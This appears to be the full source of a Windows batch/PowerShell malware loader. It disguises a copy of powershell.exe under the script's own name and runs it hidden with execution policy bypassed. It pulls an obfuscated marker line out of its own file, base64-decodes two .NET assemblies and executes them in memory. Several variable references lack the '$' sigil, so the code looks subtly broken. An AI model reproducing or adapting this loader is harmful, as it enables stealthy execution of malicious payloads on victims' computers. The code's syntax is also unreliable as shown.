
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "%~0.exe" & cd "%~dp0"

"%~0.exe" -noprofile -w hidden -ep bypass -command  

$current_file = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine); 
foreach ($line in $current_file) { 
    $regex_1 = '44XQWRMMMG9Z'
    if ($line -match $regex_1) { 
        regex_2 = [System.Text.RegularExpressions.Regex]::Replace($line, '44XQWRMMMG9Z', ''); 
        regex_2 = [System.Text.RegularExpressions.Regex]::Replace(regex_2, '#', '/'); 
        regex_2 = [System.Text.RegularExpressions.Regex]::Replace(regex_2, '@', 'A');
        break; 
    }; 
}; 
if (regex_2.Contains('ZAWOXHFNOCWKKSLSLTNPIQWVTTCDZT')) { 
    regex_2 = [System.Text.RegularExpressions.Regex]::Replace(regex_2, 'ZAWOXHFNOCWKKSLSLTNPIQWVTTCDZT', ''); 
} else { exit }; 

$string = [string[]] regex_2.Split('!'); 
first_exe = [System.Convert]::FromBase64String($string[0]); 
$h1dden_G05XUBIRRV = [System.Reflection.Assembly]::Load(first_exe);
$h1dden_V2VCUHLYR7 = $h1dden_G05XUBIRRV.EntryPoint;
$h1dden_V2VCUHLYR7.Invoke($null, $null); 

second_exe = [System.Convert]::FromBase64String($string[1]); 
$h1dden_YMOLV33MU8 = [System.Reflection.Assembly]::Load(second_exe); 
$h1dden_Q97XYZ3NLO = $h1dden_YMOLV33MU8.EntryPoint; 
$h1dden_Q97XYZ3NLO.Invoke($null, $null)

exit